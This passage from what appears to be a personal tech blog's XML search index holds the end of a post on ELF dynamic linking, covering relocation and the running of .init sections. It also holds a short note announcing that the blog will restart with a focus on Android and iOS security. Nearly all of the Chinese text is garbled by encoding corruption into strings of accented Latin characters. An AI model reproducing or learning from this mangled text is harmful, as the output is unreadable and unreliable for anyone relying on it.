<h3 id="3ï¼Œé‡å®šä½å’Œåˆå§‹åŒ–"><a href="#3ï¼Œé‡å®šä½å’Œåˆå§‹åŒ–" class="headerlink" title="3ï¼Œé‡å®šä½å’Œåˆå§‹åŒ–"></a>3ï¼Œé‡å®šä½å’Œåˆå§‹åŒ–</h3><p>å½“ä¸Šè¿°ä¸¤æ­¥å®Œæˆä»¥åï¼ŒåŠ¨æ€é“¾æ¥å™¨å¼€å§‹é‡æ–°éå†å¯æ‰§è¡Œæ–‡ä»¶å’Œæ¯ä¸ªå…±äº«å¯¹è±¡çš„é‡å®šä½è¡¨ï¼Œå°†è¡¨ä¸­æ¯ä¸ªéœ€è¦é‡å®šä½çš„ä½ç½®è¿›è¡Œä¿®æ­£ï¼ŒåŸç†åŒå‰ã€‚</p>
<p>é‡å®šä½å®Œæˆä»¥åï¼Œå¦‚æœæŸä¸ªå…±äº«å¯¹è±¡æœ‰â€œ.initâ€æ®µï¼Œé‚£ä¹ˆåŠ¨æ€é“¾æ¥å™¨ä¼šæ‰§è¡Œâ€œ.initâ€æ®µä¸­çš„ä»£ç ï¼Œç”¨ä»¥å®ç°å…±äº«å¯¹è±¡ç‰¹æœ‰çš„åˆå§‹åŒ–è¿‡ç¨‹ã€‚</p>
<p>æ­¤æ—¶ï¼Œæ‰€æœ‰çš„å…±äº«å¯¹è±¡éƒ½å·²ç»è£…è½½å¹¶é“¾æ¥å®Œæˆäº†ï¼ŒåŠ¨æ€é“¾æ¥å™¨çš„ä»»åŠ¡ä¹Ÿåˆ°æ­¤ç»“æŸã€‚åŒæ—¶è£…è½½é“¾æ¥éƒ¨åˆ†ä¹Ÿå°†å‘Šä¸€æ®µè½ï¼æ¥ä¸‹æ¥ä¾¿æ˜¯ç¨‹åºçš„æ‰§è¡Œäº†ã€‚ã€‚ã€‚</p>
]]></content>
      <tags>
        <tag>liunx</tag>
        <tag>ELF</tag>
        <tag>åŠ¨æ€é“¾æ¥</tag>
        <tag>é™æ€é“¾æ¥</tag>
      </tags>
  </entry>
  <entry>
    <title>é‡å‡ºæ±Ÿæ¹–</title>
    <url>/2020/04/29/%E9%87%8D%E5%87%BA%E6%B1%9F%E6%B9%96/</url>
    <content><![CDATA[<p>ç»2017å¹´å‚åŠ å®ä¹ ä¹‹åï¼Œç”±äºå¤ªå¿™ï¼ˆæ‡’ï¼‰blogå°±è’åºŸäº†ï¼Œå‚åŠ å·¥ä½œä»¥æ¥å‘ç°ææŠ€æœ¯æœç„¶è¿˜æ˜¯å¾—å†™ä¸€å†™è®°ä¸€è®°ï¼Œå¦‚ä»Šå‡†å¤‡é‡å‡ºæ±Ÿæ¹–ã€‚<br><a id="more"></a></p>
<p>ä»Šåä¸€æ®µæ—¶é—´çš„bolgæŠ€æœ¯é‡ç‚¹åº”è¯¥åœ¨Android&amp;iOSå®‰å…¨æ–¹é¢ï¼Œå¸Œæœ›èƒ½å­¦åˆ°æ›´å¤šçš„æŠ€æœ¯ï¼Œä¹Ÿå¸Œæœ›èƒ½å¸®åˆ°æ›´å¤šèµ°åœ¨ç ”ç©¶æŠ€æœ¯è·¯ä¸Šçš„å°ä¼™ä¼´ä»¬ã€‚</p>
]]></content>
  </entry>
</search>
